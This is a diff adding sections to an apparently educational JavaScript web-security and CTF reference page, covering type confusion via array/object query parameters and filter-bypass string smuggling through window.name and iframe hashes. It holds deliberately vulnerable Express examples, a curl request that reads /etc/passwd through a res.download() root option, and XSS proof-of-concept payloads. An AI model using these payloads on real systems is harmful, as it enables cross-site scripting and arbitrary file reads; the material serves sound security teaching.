@@ -192,6 +192,61 @@ This was a solution to a simple JavaScript CTF challenge with a detailed writeup
 Writeup of a challenge that uses `users[username]` and could be bypassed
 {% endembed %}
 
+### Type Confusion
+
+Most often, user input is a [`String`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String). However, some functions for getting query parameters or JSON are able to return more types like [`Array`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array)s or [`Object`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object)s. An application may not expect this and handle it improperly. With the flexibility of JavaScript this is especially often the case.
+
+JSON can obviously have different types by writing `["first","second"]` or `{"key":"value"}` syntax, but query parameters are more complicated. It depends on the parser, but some common ways to create _Arrays_ include:
+
+* `array=first&array=second`
+* `array[]=first&array[]=second`
+* `array[0]=first&array[1]=second`
+
+These may all be parsed as `["first","second"]`. It is sometimes also possible to create _Objects_ by giving keys inside the brackets (`[]`), and combined with arrays:
+
+* `object[key]=value&object[array][]=first`
+
+This syntax could create `{"key":"value","array":["first"]}`. When you know what is possible, you can think of how the code will handle such unexpected types.
+
+One common trick is to **confuse&#x20;**_**Strings**_**&#x20;and&#x20;**_**Arrays**_, because a lot of their methods/attributes correspond. Imagine a developer wants to validate their input and check if a [`String.includes()`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/includes) any dangerous characters. Any regular string will be caught here, but if we make our input an array, the `.includes()` method suddenly refers to [`Array.includes()`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/includes). This method only checks if any of its items are fully equal, not if the character exists in the string. \
+Code like the following could be bypassed:
+
+<pre class="language-javascript" data-title="Vulnerable Example"><code class="lang-javascript">app.get('/', (req, res) => {
+    const name = req.query.name
+<strong>    if (name.includes("&#x3C;") || name.includes(">")) {
+</strong>        res.send('Invalid name');
+    }
+    res.send(`&#x3C;h1>Hello, ${name}!&#x3C;/h1>`);
+});
+</code></pre>
+
+By turning our input into an array by providing a second `name=` parameter, the check will only verify if any of the parameters are exactly equal to `<` or `>`.
+
+<figure><img src="../../.gitbook/assets/image (57).png" alt=""><figcaption><p>Exploit using multiple <code>name=</code> parameters to turn it into an array, resulting in XSS</p></figcaption></figure>
+
+Another thing that strings and arrays have in common is their `.toString()` method, which you can see in full effect above. While most objects just turn into `[object Object]` by default, arrays will turn into their items stringified and joined by commas (`,`). This is useful for injections as they often still allow arbitrary input in their items to reflect when written somewhere.
+
+**Objects** are also interesting because some library methods will accept them as **`options`**. These may include special settings that you can now change, that would normally default if you input a string. One example is [`res.download()`](https://expressjs.com/fr/api.html#res.download) from Express ([writeup](https://mizu.re/post/heroctf-v6-writeups#sampleHub)). As the 2nd argument, it accepts _either a String as the returned filename, or an Object with options_. With the `root:` option it is possible to change the relative parent of the 1st argument, and potentially read arbitrary files:
+
+{% code title="Vulnerable Example" %}
+```javascript
+app.get("/download/:file", (req, res) => {
+    const file = path.basename(req.params.file);
+    res.download(file, req.query.filename || "file.bin");
+});
+```
+{% endcode %}
+
+The `file` path parameter may only be relative due to `path.basename()`, but using the query parameter `filename` which is normally a string, we can use brackets (`[]`) to turn it into an object. Then, we will provide the documented `root:` option to make it read from an arbitrary directory:
+
+```shell-session
+$ curl -g 'http://localhost:3000/download/passwd?filename[root]=/etc'
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+...
+```
+
 ## Filter Bypass
 
 Often alphanumeric characters are allowed in a filter, so being able to decode Base64 and evaluate the result should be enough to do anything while bypassing a filter. Acquiring the primitives to do this decoding and evaluating however can be the difficult part as certain ways of calling the functions are blocked. The simplest idea is using `atob` to decode Base64, and then `eval` to evaluate the string:
@@ -264,6 +319,43 @@ Another common method is using `String.fromCharCode()` chains to build out strin
 <pre class="language-javascript"><code class="lang-javascript"><strong>eval(String.fromCharCode(97,108,101,114,116,40,41))
 </strong>alert()
 </code></pre>
+
+### Strings from other sources
+
+In a web environment, cross-origin JavaScript can still access a few properties under your control that may be useful for smuggling strings with the injection is limited. The best example is the shortest possible XSS payload in Chrome: `eval(name)`.
+
+The `name` variable refers to [`window.name`](https://developer.mozilla.org/en-US/docs/Web/API/Window/name) and can be set by the site that opens it using the `target` parameter. It is also kept across redirects, making it potentially useful for exfiltrating as well.
+
+The logic below sets the current window's name to the XSS payload, and then uses `window.open()` to overwrite itself with the same name. This puts the name variable on the target site so it can `eval()` the value successfully:
+
+<pre class="language-html"><code class="lang-html">&#x3C;script>
+<strong>  name = "alert(origin)"
+</strong><strong>  window.open("https://example.com?xss=eval(name)", "alert(origin)")
+</strong>&#x3C;/script>
+</code></pre>
+
+To get different names instead of just one, you can refer to `opener.name` if the opener is same-origin with the target. This can be repeated like `opener.opener.name` to get an arbitrary number of strings you set, but every additional opener requires a `window.open()` call which is a user interaction on your site.
+
+Using iframes, you can get the same effect but only using a single opener. We will access them via their `name=` attribute on the window reference, so this cannot contain an arbitrary string anymore. However, the `location.hash` may also work, it just needs a `.slice(1)` to get rid of the first `#`.&#x20;
+
+This combines into a way to get arbitrary strings with only the charset `[a-z().]`. You just need to be able to iframe any page same-origin with the target, such as an error page with `/%00` or a too-long URI. Below is a proof of concept using this idea:
+
+```html
+<iframe src="https://example.com/%00#anything" name="a"></iframe>
+<iframe src="https://example.com/%00#more text<>!..." name="b"></iframe>
+<script>
+  onclick = () => {
+    window.open("https://example.com")
+  }
+</script>
+```
+
+The `https://example.com` popup can now access the prepared strings like this:
+
+```javascript
+unescape(opener.a.location.hash.slice(unescape.length))  // 'anything'
+unescape(opener.b.location.hash.slice(unescape.length))  // 'more text<>!...'
+```
 
 ### Comments
 
